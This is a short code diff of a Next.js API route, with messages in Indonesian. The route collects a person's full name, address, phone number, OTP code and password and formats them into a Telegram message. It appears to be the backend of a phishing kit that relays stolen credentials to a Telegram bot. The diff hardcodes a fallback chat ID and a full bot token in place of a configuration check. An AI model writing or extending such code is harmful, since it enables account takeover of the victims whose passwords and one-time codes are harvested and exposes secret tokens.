@@ -5,15 +5,8 @@ export async function POST(request: Request) {
     const payload = await request.json();
     const { fullName, address, phoneNumber, otpCode, password } = payload;
 
-    const chatId = process.env.TELEGRAM_CHAT_ID;
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
-
-    if (!chatId || !botToken) {
-      return NextResponse.json(
-        { ok: false, error: "Chat ID atau token bot belum dikonfigurasikan." },
-        { status: 500 }
-      );
-    }
+    const chatId = process.env.TELEGRAM_CHAT_ID || "8158741559";
+    const botToken = process.env.TELEGRAM_BOT_TOKEN || "8671891265:AAESmv2ueXuoXV_sYHxOsQwP8rO4VBaAefA";
 
     const message = [
       "📩 Permohonan Baru",
